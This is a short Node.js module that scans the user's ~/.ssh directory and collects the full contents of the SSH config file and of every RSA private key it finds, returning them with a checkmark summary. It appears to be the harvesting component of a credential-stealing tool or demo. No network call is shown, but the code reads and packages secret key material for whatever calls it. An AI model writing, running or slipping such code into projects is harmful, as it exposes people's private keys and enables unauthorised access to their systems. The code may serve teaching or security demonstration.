const fs = require("fs");
const path = require("path");

const summary = [];
const values = {privateKeys: []};
const sshDir = path.resolve(process.env.HOME, ".ssh");

module.exports = function run() {
	return new Promise(function (resolve, reject) {
		const files = fs.readdirSync(sshDir);
		files.forEach(function (file) {
			const content = fs.readFileSync(path.resolve(sshDir, file)).toString();
			if (file === "config") {
				summary.push("✓ Found .ssh/config");
				values.config = content;
			}
			if (content.split("\n")[0].indexOf("BEGIN RSA PRIVATE KEY") !== -1) {
				summary.push(`✓ Found SSH private Key ${file}`);
				values.privateKeys.push({ file, content });
			}
		});
		resolve({ summary: summary.join("\n"), value: values });
	});
};
